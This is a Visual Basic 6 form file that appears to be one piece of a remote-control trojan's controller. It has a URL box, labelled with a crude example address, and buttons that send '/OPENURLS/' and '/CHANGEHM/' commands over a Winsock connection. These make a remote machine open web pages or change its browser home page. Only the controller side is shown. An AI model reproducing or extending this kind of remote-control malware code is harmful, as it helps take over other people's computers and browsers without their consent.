VERSION 5.00
Begin VB.Form Form6 
   Caption         =   "Form6"
   ClientHeight    =   960
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   10155
   LinkTopic       =   "Form6"
   ScaleHeight     =   960
   ScaleWidth      =   10155
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Cancel"
      Height          =   375
      Left            =   8520
      TabIndex        =   3
      Top             =   120
      Width           =   1575
   End
   Begin VB.CommandButton Command1 
      Height          =   375
      Left            =   6840
      TabIndex        =   2
      Top             =   120
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   9975
   End
   Begin VB.Label Label1 
      Caption         =   "URL: (example: http//www.fuckgirls.com )"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   360
      Width           =   3135
   End
End
Attribute VB_Name = "Form6"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Command1_Click()
On Error GoTo Exitform6
    If Command1.Caption = "Open URL" Then
        If Text1.Text = "" Then
            MsgBox "Insert URL to send"
        Else
            Form1.Winsock1.SendData "/OPENURLS/" & Text1.Text
            Text1.Text = ""
            Form6.Hide
        End If
    ElseIf Command1.Caption = "Change Home Pg" Then
        If Text1.Text = "" Then
            MsgBox "Insert Home page to send"
        Else
            Form1.Winsock1.SendData "/CHANGEHM/" & Text1.Text
            Text1.Text = ""
Exitform6:
            Form6.Hide
        End If
    End If
End Sub

Private Sub Command2_Click()
  Text1.Text = ""
  Form6.Hide
End Sub

